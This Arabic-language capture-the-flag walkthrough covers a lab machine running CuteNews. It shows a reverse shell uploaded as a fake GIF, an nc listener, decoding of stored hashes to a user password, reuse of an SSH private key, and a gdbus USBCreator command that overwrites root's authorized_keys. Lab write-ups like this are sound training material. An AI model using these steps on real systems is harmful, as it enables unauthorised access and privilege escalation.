


  ![Desktop View](/img/psg/0.png)

# Sammmry:

 
نقوم باستغلاله للحصول cute news اثناء جمع المعلومات نجد

 ثم نفحص داخل السيرفر نجد نصوص مشفرة نقوم ب user على

 ان privesclationثم نجد في عملية user كسرها لنحصل على

 نحصل على رووت باستغلاله usb cretorالسيرفر يستخدم


- 1 recon
   - 1.1 nmap
   - 1.2 exploiting Arbitrary file upload:
      - 1.2.register new user
      - 1.2.2 Preparation the shell
      - 1.2.3 Netcat
      - 1.2.4 Upload shell
      - 1.2.5 Got shell...................................................................................
   - 1.3 User enemiration
      - 1.3.1 Base64 decode :
      - 1.3.2 Sha256 decode :
      - 1.3.3 Paul login
      - 1.3.4 Ssh private key
   - 1.4 Privilege Escalation
      - 1.3.1 usb cretor :
      - 1.3.1 exploit :


# Walkthrough

## 1 recon

### 1.1 nmap


nmap نبدا بفحص البورتات باستخدام

![Desktop View](/img/psg/1.png)

: نلاحظ وجود 2 بورت


 ‫الخاص‬ بالويب سيرفر ‫‪:‬‬ ‫‪80‬‬ 


ssh ‫الخاص‬ ب ‫‪:‬‬ ‫‪22‬‬  



 80 لنبدا مع

نقوم بالتصفح

![Desktop View](/img/psg/2.png)

عند فتح الصفحة نلاحظ

cutenews في الاسفل ان الموقع يستخدم   



cutenews بالبحث عن

عبر جوجل نجد انه

 مصاب بثغرة 

 


Arbitrary File Upload





https://www.exploit-db.com/exploits/


### 1.2 exploiting Arbitrary file upload:

#### 1.2.register new user

 نتوجه في البداية الى

http://10.10.10.206/CuteNews

لنقوم بانشاء مستخدم جديد Register ثم نذهب 
الى



![Desktop View](/img/psg/3.png)


 بعد التسجيل نقوم بتسجيل الدخول

![Desktop View](/img/psg/4.png)


#### 1.2.2 Preparation the shell

الخاص بنا يمكنك اجاده هنا php shellنجهز

https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php


الخاص بك ip  ب  host قم بتغير ال  





(tun0 بجانب ip ad باستخدام امر ipتجد ال)



magic bytes ثم نقوم بوضع

في بداية الملف gif الخاصة ب 

Gif8 ;



![Desktop View](/img/psg/5.png)

#### 1.2.3 Netcat

nc listenerقم بتشغيل


: على جهازك باستخدام الامر التالي  

```
nc -lnvp 4444
```



 رقم البورت اختر ماتشاء‬  ‫‪:‬‬ ‫‪4444‬‬ 



![Desktop View](/img/psg/6.png)

#### 1.2.4 Upload shell

الخاص بنا على الموقع shellثم نقوم برفع

save changesثم Choose file


![Desktop View](/img/psg/7.png)

(shell)نقوف بفتح الصورة المرفوعة



![Desktop View](/img/psg/8.png)

![Desktop View](/img/psg/9.png)

#### 1.2.5 Got shell....

 : عند فتح الصورة في المتصفح نتحصل على اتصال مع السيرفر


![Desktop View](/img/psg/10.png)


apacheبصلاحية shell تحصلنا على


### 1.3 User enemiration


  نقوم الان بالبحث عن المعلومات داخل 
  السيرفر نجد

 بعض النصوص

:مشفرة داخل ملف

/var/www/hml/CuteNews/cdata/users 


![Desktop View](/img/psg/11.png)



![Desktop View](/img/psg/12.png)

#### 1.3.1 Base64 decode :


base 64 نقوم بفك تشفير


![Desktop View](/img/psg/13.png)

#### 1.3.2 Sha256 decode :


 sha256 نجد كلمة سر مشفرة ب    

: نقوم بفكها باستخدام موقع 

http://crackstation.net


![Desktop View](/img/psg/14.png)

base 64 ومن الكود المشفر ب user paulنجد /homeنذهب اللى
atlanta1وان كلمة السر paulفي الاعلى نعلم ان اليوز




#### 1.3.3 Paul login


 : نقوم بتسجيل الدخول باستخدام الامر التالي
```
Su paul
```

![Desktop View](/img/psg/15.png)

#### 1.3.4 Ssh private key

```
/home/paul/.sshعند الدخول الى
private key نجد
نقوم بنسخه ولصقه في جهازك id_rsaفي sshالخاص ب 
قم بتسميته ماتشاء id ملف اسمه
```


![Desktop View](/img/psg/16.png)



 : نغير صلاحيات الملف باستخدام امر  


```
Chmod 600 id
```

: ssh ثم نقوم بالاتصال باستخدام
```
Ssh –i id nadav@10.10.10.206

```
اسم الملف : Id

اليوزر : Nadav


![Desktop View](/img/psg/17.png)






نقوم بعرض جميع الملفات باستخدام الامر
```
ls -la
```
فنجد ملف تحت اسم 


نقوم بعرضه باستخدام الامر .viminfo


```
cat .viminfo
```

![Desktop View](/img/psg/18.png)


![Desktop View](/img/psg/19.png)


### 1.4 Privilege Escalation

# 1.4.1 Usb creator


نبحث عن

في جوجل usb creator dbus privilege escalation 


نجد مقال يتحدث عنه

https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/


# 1.4.2 exploit

 
 root الخاص ب authorized_keys نقوم بالاستغلال وذلك باستبدال

 ثم نتصل من nadav الخاص ب authorized_keys ب 

 root مباشرة ب nadav

 : نكتب الامر التالي

```
gdbus call --system --dest com.ubuntu.USBCreator --object-path
/com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image
/home/nadav/.ssh/authorized_keys /root/.ssh/authorized_keys true

```


root flag :D نقوم بسحب


![Desktop View](/img/psg/20.png)
